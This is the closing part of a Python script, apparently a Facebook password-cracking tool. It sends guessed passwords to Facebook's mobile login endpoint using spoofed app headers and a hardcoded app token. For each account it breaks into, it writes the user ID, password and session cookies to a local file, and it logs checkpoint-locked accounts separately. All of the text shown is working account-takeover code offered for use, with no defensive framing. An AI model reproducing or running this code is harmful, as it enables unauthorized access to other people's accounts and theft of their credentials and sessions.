            "cpl": "true",
            "source": "login",
            "format": "json",
            "omit_response_on_success": "false",
            "credentials_type": "password",
            "error_detail_type": "button_with_disabled",
            "generate_session_cookies": "1",
            "generate_analytics_claim": "1",
            "generate_machine_id": "1",
            "tier": "regular",
            "currently_logged_in_userid" : "0",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
            head = {
            "User-Agent": arafat2(),
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-FB-HTTP-Engine": "Liger",
            'X-FB-Client-IP': 'True',
            "X-FB-Friendly-Name": "authenticate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(content_lenght))}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[ARAFAT-OK] {uid} | {pas}')
                open('/sdcard/ARAFAT-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'Please Confirm Email' in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[ARAFAT-OK] {uid} | {pas}')
                open('/sdcard/ARAFAT-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/ARAFAT-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

##------------------[ END-MENU ]------------------##
if __name__ == '__main__':
    #Main.Awm()
    apvroval.check()